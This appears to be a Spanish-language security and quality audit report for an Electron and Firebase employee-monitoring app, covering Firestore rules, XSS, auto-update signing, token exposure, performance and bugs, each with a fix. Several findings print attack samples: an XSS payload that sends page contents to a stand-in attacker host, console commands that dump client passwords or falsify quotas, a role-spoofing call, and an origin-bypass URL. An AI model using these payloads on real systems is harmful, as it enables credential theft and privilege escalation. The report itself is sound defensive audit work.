# Informe Final de Auditoría — Academic Tareas Monitor

**App auditada:** aplicación de escritorio (Electron + Firebase) de monitoreo de productividad de empleados.
**Fecha:** 2026-07-31
**Método:** 6 auditores de dominio en paralelo (secretos/distribución, reglas de Firestore, proceso principal Electron, XSS en la UI, rendimiento/recursos, bugs funcionales) + verificación adversarial de cada hallazgo contra el código real + síntesis.

---

## Resumen ejecutivo

Hay **tres problemas críticos** que, combinados, comprometen todo el propósito y la seguridad del producto:

1. **Cualquier persona en internet puede leer las contraseñas de las plataformas de tus clientes** y borrar/falsificar todos los datos, sin ser empleado. El registro de cuentas está abierto y las reglas de Firestore no autorizan, solo autentican.
2. **Un empleado de bajo nivel (asesor) puede ejecutar código en la pantalla del director** mediante campos de pedido con HTML malicioso (XSS almacenado). Roba datos y contraseñas con los privilegios del director.
3. **La cadena de actualización automática de Windows no está firmada.** Quien logre publicar en el repositorio (protegido por un solo token) instala malware silenciosamente en toda la flota de PCs.

Además, el **corazón del producto (el monitoreo) es falsificable y frágil**: un empleado puede poner su cuota en cero desde la consola, y por bugs de código el guardado de actividad se cuelga (grave en Windows, donde casi nunca guarda).

**Lo bien hecho** (no tocar): el aislamiento de Electron, la firma/notarización del build de Mac, y el bloqueo de auto-promoción de rol en Firestore están correctos.

---

# 1. Seguridad

## CRÍTICAS

### S1. Registro abierto + reglas abiertas: cualquiera en internet lee contraseñas de clientes y altera todos los datos
**Dónde:** `firestore.rules:34-38` (y alta de usuarios en `renderer/director.html:1461`)
**Qué puede pasar:** El alta de usuarios se hace desde el cliente con `createUserWithEmailAndPassword`, lo que obliga a tener el registro Email/Password habilitado. La apiKey es pública (app distribuida + repo público). Un atacante externo llama al endpoint público de registro de Firebase, obtiene un token válido (`request.auth != null`) **sin ser empleado ni tener documento en `usuarios`**, y como las reglas de las colecciones operativas solo exigen "autenticado", ejecuta `getDocs(collection(db,'tareas'))` y **exfiltra en un solo query las contraseñas en texto plano de todas las plataformas de tus clientes**, además de poder borrar/falsificar cualquier pedido, cuota o actividad.
**Corrección:**
- Mover el alta de usuarios a una **Cloud Function con Admin SDK** (o blocking function `beforeCreate`) y **deshabilitar el sign-up público** de Email/Password.
- En **todas** las reglas exigir que exista el documento `usuarios/{uid}` y validar el rol por colección. No tratar "autenticado" como autorización.
- Nota: la mitigación de `SEGURIDAD.md` ("solo el equipo autenticado ve los datos") es **falsa** mientras el registro esté abierto.

### S2. XSS almacenado cruzado entre roles: un asesor ejecuta código en la sesión del director
**Dónde:** `renderer/index.html:1470/1495/1562/1611/1663`, `renderer/director.html:699/735`, `renderer/atc.html:2013`, `renderer/app.js:654-720`
**Qué puede pasar:** Todos los dashboards concatenan campos de pedido de Firestore (`cliente`, `materia`, `anotaciones`, `entregable`, `contrasena`, nombres, títulos/URLs de Chrome) directamente en `innerHTML` **sin escape**, y la CSP usa `'unsafe-inline'`. Como cualquier autenticado puede escribir en `tareas`, un asesor crea un pedido con `cliente = <img src=x onerror="window.AT.syncPedido({url:'https://atacante.com',payload:document.body.innerText})">`. Cuando el **director o gerencia** abre su panel, el código ejecuta en **su** contexto y exfiltra todo lo visible (incluidas las contraseñas de clientes). Escalada de privilegios real asesor → director.
**Corrección:**
- Portar la función `safe()` que **ya existe** en `renderer/report-image.html:208` y aplicarla a **todo** dato dinámico antes de concatenar, o construir el DOM con `textContent`/`createElement`.
- Aplicarlo en `index.html`, `director.html`, `gerencia.html`, `atc.html` y `app.js` (`renderReport`).
- Prohibir `innerHTML` con datos de Firestore como regla del proyecto.

### S3. Auto-update de Windows sin firma ni verificación de publicador (RCE de toda la flota)
**Dónde:** `main.js:838-843` (`autoDownload=true`, `autoInstallOnAppQuit=true`), `package.json:92-95`
**Qué puede pasar:** El instalador NSIS de Windows se publica **sin firma Authenticode** (verificado: tabla de certificados del `.exe` vacía). `electron-updater` solo compara el hash contra `latest.yml`, que sale del **mismo release público**; no verifica autenticidad del publicador. Cada 4 h los clientes descargan e instalan al cerrar la app, sin interacción. Quien logre escribir en el repo/releases publica un `Setup.exe` malicioso con su hash correcto y obtiene **ejecución de código arbitrario silenciosa en todos los PCs Windows**.
**Corrección:**
- Firmar el instalador Windows con certificado de code-signing (Authenticode/EV) y configurar `publisherName` para que `electron-updater` valide firma.
- Mientras no haya firma: **desactivar el auto-install en Windows** (dejar solo notificación manual).
- En Mac el riesgo es menor porque el build va firmado y notarizado.

## ALTAS

### S4. El GH_TOKEN clásico es el único candado de toda la cadena de releases
**Dónde:** `.env:1`
**Qué puede pasar:** Es un PAT **clásico** con scope `repo`: da escritura a **todos** los repos del propietario y permite crear releases/subir instaladores. Es el único control que protege S3. Si se filtra (historial de shell, backups, `ps` con la URL de git — ver S15, o un colaborador con acceso al Mac), el atacante publica la actualización maliciosa que se auto-instala en la flota.
**Corrección:** Reemplazar por un **fine-grained PAT** limitado a `Contents:write` solo en `academic-tareas-monitor`, con expiración corta; mejor aún, OIDC/GitHub Actions en vez de un PAT de larga vida. **Rotar el token actual.**

### S5. Colecciones operativas sin autorización: el empleado falsifica su propia productividad
**Dónde:** `firestore.rules:37-38` (y `34-36`)
**Qué puede pasar:** `cuota_diaria` (id `{uid}_{fecha}`) y `rechazos` permiten escritura a cualquier autenticado, sin comprobar que el `uid` coincida con el dueño. Un asesor abre la consola y hace `setDoc(doc(db,'cuota_diaria','SU_UID_2026-07-31'),{cuota_actual:0})` para verse cumplido, borra sus `rechazos` del día, o marca tareas ajenas como completadas. **Anula la fiabilidad de toda la medición.**
**Corrección:** Reglas por documento: exigir `request.auth.uid == dueño` para escritura propia y rol `gerencia`/`director` para ajenas; restringir `delete` de `tareas` a `atc`/`gerencia`/`director`; validar transiciones de `estado` por rol.

### S6. Contraseñas de plataformas de clientes en texto plano, legibles por todo autenticado
**Dónde:** `firestore.rules:34`; se renderizan en `renderer/director.html:1073`, `renderer/index.html:766`, `renderer/atc.html:2025`
**Qué puede pasar:** El campo `contrasena` se guarda en texto plano y `tareas` concede lectura a cualquier autenticado. Un asesor descontento hace `getDocs(collection(db,'tareas'))` y se lleva las credenciales de las plataformas de **todos** los clientes, incluidos pedidos que no le fueron asignados.
**Riesgo aceptado / mitigación:** `SEGURIDAD.md` lo documenta como riesgo de negocio (decisión válida del dueño) — **pero** su mitigación ("solo el equipo lo ve") deja de ser cierta por S1 y S2. Mínimo: restringir lectura de `tareas` por ownership/rol. Ideal: cifrar el campo con clave fuera del cliente.

### S7. Bypass de la allowlist de origen (`startsWith`) expone todo el puente IPC a un dominio atacante
**Dónde:** `main.js:84` (`esOrigenPermitido`)
**Qué puede pasar:** Usa `url.startsWith('https://academic-tareas-monitor.web.app')`, que **no delimita el host**: `https://academic-tareas-monitor.web.app.evil.com/x` pasa la validación. Un redirect, un enlace o un compromiso del hosting navega la ventana principal a ese dominio, que se carga **con el preload** y obtiene `window.AT` completo (`syncPedido`, `uninstallApp`, `openUrl`, `authSuccess`).
**Corrección:** Comparar origen exacto: `new URL(url).origin === new URL(REMOTE_UI).origin`. Mismo criterio en `did-fail-load`/`did-navigate`.

### S8. El puente IPC amplifica cualquier XSS a exfiltración que evade la CSP y a ejecución en el proceso main
**Dónde:** `main.js:786` (`sync-pedido`), `main.js:458` (`open-url`)
**Qué puede pasar:** `sync-pedido` hace un `POST` HTTPS con `url` y `payload` **controlados por el renderer**, desde el proceso main (módulo `https` de Node), **fuera del alcance de la CSP** — la exfiltración funciona aunque endurezcas la CSP. `open-url` hace `shell.openExternal(url)` **sin validar el esquema**, aceptando `file:`, `smb:` o manejadores de protocolo del SO.
**Corrección:** En `sync-pedido`, allowlistar el host destino (solo el webhook de Apps Script). En `open-url`, aplicar `/^https?:/i` antes de `openExternal`.

## MEDIAS

### S9. `auth-success` confía en el rol enviado por el renderer → el empleado desactiva su propio monitoreo
**Dónde:** `main.js:764-767`, `main.js:159`
**Qué puede pasar:** El main recibe el objeto usuario (incluido `rol`) del renderer y **no lo re-verifica**. El tracking solo arranca para `asesor`/`gerencia`/`atc`. Un empleado abre DevTools y llama `window.AT.authSuccess({uid, email, nombre, rol:'director'})`: carga `director.html`, que **no inicia el tracking**, deshabilitando la captura de clics/teclas/apps/idle. (Las escrituras de `usuarios`/`configuracion` siguen protegidas por reglas, pero evade el monitoreo, que es el core.)
**Corrección:** Verificar el ID token de Firebase en el main (o releer `usuarios/{uid}.rol` server-side) y derivar rol/tracking de esa verificación.

### S10. `sync-pedido`: SSRF por seguir redirects arbitrarios enviando contraseñas en texto plano
**Dónde:** `main.js:806`
**Qué puede pasar:** Sigue manualmente `Location` (hasta 5 saltos) reenviando el **mismo POST con `contrasena` en claro** a cualquier host, sin allowlist. Un webhook que responda `302` hacia un host interno/atacante recibe las contraseñas y PII del pedido.
**Corrección:** Restringir destino a `script.google.com`/`script.googleusercontent.com` en la URL inicial **y en cada redirect**.

### S11. Entitlements de macOS debilitan el hardened runtime (inyección de dylib)
**Dónde:** `build/entitlements.mac.plist:13`
**Qué puede pasar:** Combina `disable-library-validation` + `allow-dyld-environment-variables`, lo que reabre `DYLD_INSERT_LIBRARIES` sobre una app firmada/notarizada con captura global de teclado. Un proceso local con acceso al usuario lanza la app con una dylib maliciosa que captura todo lo tecleado con la fachada legítima. (Requiere ejecución previa como el mismo usuario → media.)
**Corrección:** Quitar `allow-dyld-environment-variables` (uiohook-napi no lo requiere). Evaluar firmar el módulo nativo con el mismo Developer ID para quitar también `disable-library-validation`.

### S12. Ausencia total de validación de esquema en las reglas de Firestore
**Dónde:** `firestore.rules:34`
**Qué puede pasar:** Ninguna regla valida tipos, campos, tamaños o inmutabilidad. Un autenticado escribe strings enormes (inflar costos), inyecta un `estado` inexistente que rompe los dashboards, o inserta payloads que alimentan S2.
**Corrección:** `hasOnly()` de campos permitidos, comprobación de tipos, límites de longitud y campos inmutables (`creado_por_id` no reasignable).

### S13. CSP con `'unsafe-inline'` y `'unsafe-eval'` en todas las vistas principales
**Dónde:** `renderer/index.html:6`, `login.html`, `atc.html`, `director.html`, `gerencia.html`
**Qué puede pasar:** `'unsafe-inline'` es lo que **habilita** los `onerror` de S2/S8. `connect-src` no se declara y hereda un `default-src` amplio, permitiendo exfiltración a endpoints Firebase/Google.
**Corrección:** Eliminar `'unsafe-eval'` (Firebase v11 modular no lo necesita), mover JS inline a archivos con nonces/hashes para quitar `'unsafe-inline'`, declarar `connect-src` acotado. Ya lo hacen bien `overlay.html` y `report-image.html`.

### S14. La URL del webhook de Google Sheets es legible por cualquier autenticado
**Dónde:** `firestore.rules:27`; escritura en `director.html:1723`, lectura en `atc.html:1136`
**Qué puede pasar:** Cualquier autenticado (o auto-registrado externo por S1) obtiene la URL. Si el Apps Script acepta POST sin autenticación adicional, puede inyectar/alterar filas del Sheet.
**Corrección:** Restringir lectura de `configuracion` a `gerencia`/`director` y añadir un token compartido que el Apps Script valide.

### S15. `GH_TOKEN` en la URL del remoto de git (fuga por `ps`) y `.env` world-readable
**Dónde:** `PUBLICAR ACTUALIZACION.command:40`; `.env` con permisos 644
**Qué puede pasar:** `git push --force https://balamentbiz:${GH_TOKEN}@github.com/...` expone el token en la tabla de procesos durante la publicación. `.env` (`-rw-r--r--`) deja el `GH_TOKEN` y el `APPLE_APP_SPECIFIC_PASSWORD` legibles para cualquier usuario local.
**Corrección:** `chmod 600 .env` (o Keychain). Usar credential helper / `GIT_ASKPASS` no persistente; evitar `--force` en el canal de publicación. Reemplazar `export $(grep...)` por `set -a; source .env; set +a`.

## BAJAS

### S16. IPC destructivo (`uninstall-app`, `quit-app`) invocable por cualquier renderer
**Dónde:** `main.js:422`, `main.js:420`
**Qué puede pasar:** Una página cargada por el bypass de S7 (o XSS de S2) llama `window.AT.quitApp()` o `uninstallApp()`. Mitigado en parte por el diálogo nativo con "Cancelar" por defecto. **No hay inyección de comandos**: las rutas de `rm -rf` son constantes. Prioridad real: corregir S7.

### S17. Mensajes de error y email reflejados en `innerHTML` (self-XSS)
**Dónde:** `renderer/director.html:1520`, `renderer/atc.html:1520` y otras
**Qué puede pasar:** El email/nombre del propio operador se refleja sin escapar. Impacto limitado a la propia sesión, pero patrón inseguro consistente.
**Corrección:** Usar `textContent` para mensajes de estado.

---

# 2. Rendimiento y recursos

## ALTA

### R1. `startActivityPolling` no es idempotente: duplica listeners de uiohook y multiplica el conteo de clics
**Dónde:** `main.js:572-611`
**Qué puede pasar:** La guarda `_uiohookActive` se **escribe pero nunca se lee** (código muerto). `loadDashboard` llama esta función en **cada login**, y `auth-logout` no la detiene. Tras cerrar sesión y volver a entrar 3 veces sin reiniciar, hay **3 listeners `mousedown`**: un clic físico suma 3 a `session.clicks`. El reporte muestra ~3× los clics/teclas reales — **corrupción directa de los datos de productividad** — más 3 intervalos de 800 ms en paralelo.
**Corrección:** Guardar el id del `setInterval` y limpiarlo al inicio; registrar los `uIOhook.on` una sola vez (o `removeAllListeners` antes); no re-llamar `uIOhook.start()` si ya está activo. En `auth-logout`, detener flush, trackInterval y `uIOhook.stop()`.

## MEDIAS

### R2. Acumuladores de módulo (`activeApps`, `chromePages`, `currentChromeUrl`, `_activityEvents`) nunca se reinician entre sesiones
**Dónde:** `main.js:564-569`; `start-day` (`251`), `end-day` (`285`), `auth-logout` (`771`)
**Qué puede pasar:** Ningún handler los reinicia. El corte a 50 (`737-738`) solo aplica al array serializado, no al objeto fuente. (a) **datos incorrectos**: el reporte de un segundo turno hereda apps/páginas del turno anterior; (b) **memoria sin techo**: `chromePages` acumula una entrada por cada URL única durante toda la vida del proceso.
**Corrección:** En `start-day`, reiniciar `activeApps={}`, `chromePages={}`, `currentChromeUrl=''`, `_activityEvents=0`. Aplicar el cap (o LRU por `lastSeen`) al objeto en memoria.

### R3. `save()` serializa toda la sesión (`current.json` completo) cada ~10 s
**Dónde:** `main.js:18-24`, invocado desde `trackInterval` (`645`)
**Qué puede pasar:** Cada tick hace `JSON.stringify` de **todo** `session` (pages, activities, idlePeriods, appLog reconstruido), aunque solo cambió un contador. En una jornada larga son cientos de KB reescritos ~2880 veces/día.
**Corrección:** Escribir con menos frecuencia o de forma incremental; actualizar `appLog` en vez de reconstruirlo cada tick.

## BAJAS

### R4. uiohook global nunca se detiene en logout ni fin de sesión
**Dónde:** `main.js:610`; `auth-logout` (`771-780`)
**Qué puede pasar:** El hook de bajo nivel sigue procesando cada evento del sistema toda la noche si la app queda en el login. Overhead permanente innecesario.
**Corrección:** `uIOhook.stop()` en `auth-logout` y `end-day`; reiniciar solo al comenzar sesión activa.

### R5. `osascript` spawneado vía `exec` cada 10 s (2 procesos) toda la sesión
**Dónde:** `main.js:643/669/708`
**Qué puede pasar:** ~5760 procesos `osascript` en 8 h. Overhead modesto (async), pero si no se concedió permiso de Automatización a Chrome, cada tick genera error, agravando B1.
**Corrección:** Subir el intervalo a 30-60 s, fusionar ambos `osascript`, usar `execFile`, consultar Chrome solo si es la app al frente.

### R6. Doble registro de `onSessionTick` en el renderer
**Dónde:** `renderer/app.js:249` y `263`
**Qué puede pasar:** Dos listeners al canal `session-tick` corriendo trabajo redundante en cada tick; `_lastActiveMs`/`_lastIdleMs` declaradas con `var` dos veces. Sin impacto funcional; deuda de mantenimiento.
**Corrección:** Unificar en un solo handler y eliminar la redeclaración.

## INFO

### R7. `save-report-image` usa esperas fijas (~1.8 s)
**Dónde:** `main.js:366/385`
**Qué puede pasar:** `setTimeout` fijo de 1500 ms + 300 ms antes de `capturePage()`, aunque el contenido esté listo en 200 ms. Operación puntual, bajo impacto.
**Corrección:** Usar `document.fonts.ready` en vez de `setTimeout` fijo, o embeber las fuentes localmente.

---

# 3. Bugs / glitches

## ALTA

### B1. `trackApps`/`trackChrome` nunca resuelven su Promise en la ruta de error → el guardado periódico se cuelga (crítico en Windows)
**Dónde:** `main.js:672`, `main.js:711` (y `716`)
**Qué puede pasar:** Los callbacks de `exec` hacen `if (err || !stdout) return;` **sin llamar a `resolve()`**. `trackInterval` hace `Promise.all([trackApps(), trackChrome()]).then(save)`. Si cualquiera falla, su Promise queda pendiente **para siempre**, `Promise.all` nunca cumple y el `save()` periódico de `current.json` **no ocurre**. Escenarios:
- **En Windows `osascript` no existe** → falla siempre → el guardado periódico **nunca corre en toda la plataforma**. Si el PC se apaga o la app crashea, se pierde todo el tiempo activo del día. (La app se auto-actualiza en Windows, así que hay usuarios Windows.)
- **En Mac**, basta con que Chrome esté cerrado o en `about:blank` para que el `save` deje de correr silenciosamente.
- Se filtran ~6 Promises colgadas por minuto (fuga de memoria).
**Corrección:** Llamar `resolve()` **siempre**, también en error (`if (err || !stdout) return resolve();`) y en el early-return de URL vacía. Condicionar `trackApps`/`trackChrome` a `process.platform === 'darwin'` y resolver de inmediato en Windows. Envolver `Promise.all` con timeout.

## MEDIAS

### B2. `uninstall-app` en Windows es un no-op que reporta "Desinstalación completada"
**Dónde:** `main.js:438-446`
**Qué puede pasar:** Ejecuta `rm -rf` (comandos Unix inexistentes en Windows) en try/catch vacíos. En Windows falla silenciosamente pero muestra "ha sido desinstalado" y llama `app.quit()`. El empleado cree que desinstaló y **todo sigue instalado**.
**Corrección:** Ramificar por `process.platform`: en Windows usar `fs.rmSync`/`rmdir /s /q`, y mostrar éxito solo si no hubo error.

### B3. El overlay de idle a pantalla completa no se cierra si la sesión termina mientras está abierto
**Dónde:** `main.js:285` (`end-day`), `771` (`auth-logout`); `closeIdleOverlay()` solo se llama desde `idle-overlay-resume` (`543`)
**Qué puede pasar:** Si el asesor pulsa "Terminar sesión" desde otro monitor mientras el overlay está abierto, `session` pasa a `null` pero **los overlays siguen tapando pantallas completas**, y el botón de reanudar depende de `session` — no hay forma de cerrarlos.
**Corrección:** Llamar `closeIdleOverlay()` en `end-day`, `pause-session` y `auth-logout`.

## BAJAS

### B4. `currentIdleStart` huérfano tras reinicio → un idle abarca el tiempo que la app estuvo cerrada
**Dónde:** `main.js:173`, `331`/`551`
**Qué puede pasar:** Si la app se cierra con un idle abierto y se reabre al día siguiente, el primer cierre de idle registra un `idlePeriod` de muchas horas que **incluye el tiempo apagado**, distorsionando `totalIdleMs` y `productivityPct`.
**Corrección:** Al cargar la sesión, si `currentIdleStart` no es null y la última actividad es antigua, acotar o descartar ese idle.

### B5. `save()` con debounce de 2 s pierde la última escritura al salir por "Salir"
**Dónde:** `main.js:18`, `quit-app` (`420`)
**Qué puede pasar:** El asesor crea una actividad y en <2 s pulsa "Salir"; `quit-app` llama `app.quit()` sin flush, y el último cambio se pierde.
**Corrección:** En `quit-app`/`before-quit`, hacer flush síncrono (`saveNow`) antes de `app.quit()`.

### B6. Cronómetro de pausa congelado al reabrir la app en estado "paused"
**Dónde:** `renderer/app.js:205`, `608`; `pauseStartTs` solo se asigna en `btn-pause` (`336`)
**Qué puede pasar:** Al reabrir en pausa, `startPauseTick` hace `if (!pauseStartTs) return;` y el contador nunca avanza. Solo glitch visual (`totalPausedMs` se calcula bien).
**Corrección:** En init, si `session.status==='paused'`, fijar `pauseStartTs` a la última pausa abierta.

## INFO

### B7. Rutas muertas: `show-idle` nunca se emite; handler `input-events` nunca se dispara
**Dónde:** `main.js:751`, `preload.js:19`, `renderer/app.js:208`
**Qué puede pasar:** No explotable, pero confunde el modelo de "de dónde vienen los clics". `uncaughtException`/`unhandledRejection` (`main.js:7`) solo hacen `console.error(message)`, ocultando fallos del tracking.
**Corrección:** Eliminar rutas muertas; registrar stack completo en un log persistente.

---

# 4. Qué arreglar primero (plan priorizado)

| # | Acción | Aborda | Esfuerzo | Por qué primero |
|---|--------|--------|----------|-----------------|
| 1 | **Deshabilitar sign-up público** + alta de usuarios en Cloud Function + exigir doc/rol en TODAS las reglas | S1, S5, S6, S12, S14 | Medio | Cierra la fuga de contraseñas de clientes a todo internet. Una pieza resuelve varios hallazgos. |
| 2 | **Escapar todo dato dinámico** en los dashboards (portar `safe()`) | S2, S17 | Medio | Elimina la escalada asesor→director. El código de referencia ya existe. |
| 3 | **Corregir los `resolve()` faltantes** + `platform==='darwin'` en tracking | B1 | Bajo | Restaura el guardado de datos (hoy roto en todo Windows). Pocas líneas, alto impacto. |
| 4 | **Firmar instalador Windows** (o desactivar auto-install entretanto) + rotar/fine-grain el token | S3, S4, S15 | Alto (firma) / Bajo (mitigación) | Elimina el RCE de flota. Mitigación rápida de esfuerzo bajo. |
| 5 | **`startActivityPolling` idempotente** + reset de acumuladores en `start-day` + `uIOhook.stop()` en logout | R1, R2, R4 | Bajo | Restaura la exactitud del conteo (hoy se multiplica por re-login) y frena la fuga de memoria. |
| 6 | **Validar origen exacto** + filtro de esquema en `open-url` + allowlist en `sync-pedido` | S7, S8, S10, S16 | Bajo | Cierra el bypass que convierte cualquier XSS o redirect en control total del IPC. |
| 7 | **Verificar rol server-side** en `auth-success` | S9 | Medio | Impide que el empleado apague su propio monitoreo. |
| 8 | Endurecer CSP; quitar `allow-dyld-environment-variables` | S13, S11 | Medio | Defensa en profundidad; replica lo que ya hacen `overlay/report-image`. |
| 9 | Fixes de datos/UX: uninstall Windows, overlay colgado, idle huérfano, flush en quit, glitches | B2–B7, R3, R5, R6, R7 | Bajo c/u | Un sprint de limpieza. |

**Riesgo aceptado:** guardar contraseñas de clientes en Firestore (S6) es decisión de negocio documentada. Aceptable **solo si** se cierran S1 y S2 primero.

---

# 5. Lo que YA está bien hecho (no re-tocar)

- **Aislamiento de Electron correcto:** `contextIsolation:true`, `nodeIntegration:false`, `sandbox:true` en todas las ventanas. `osascript`/`rm -rf` usan cadenas fijas — **no hay inyección de comandos**.
- **Build de Mac firmado y notarizado:** Developer ID + notarization ticket stapled. Higiene menor: dejar `mac.notarize` coherente en `package.json`.
- **Secretos fuera de git y fuera del instalador:** el `GH_TOKEN` nunca se commiteó, no está en `app.asar` ni en `dist/`. El workflow usa `secrets.GH_TOKEN` sin `echo`.
- **Auto-promoción de rol bloqueada:** `usuarios/{uid}` y `configuracion/{doc}` solo se escriben con `esDirector()`, fail-closed. **Extender este patrón** a las demás colecciones.
- **`report-image.html` y `overlay.html` bien endurecidas:** usan `safe()` y CSP estricta con `connect-src 'none'`. **Modelo a replicar.**
- **Falso positivo a evitar:** la **Firebase apiKey en el cliente NO es un secreto** — es identificador público de proyecto. El problema real no es la apiKey, sino que **las reglas de Firestore no autorizan** (S1/S5/S6).
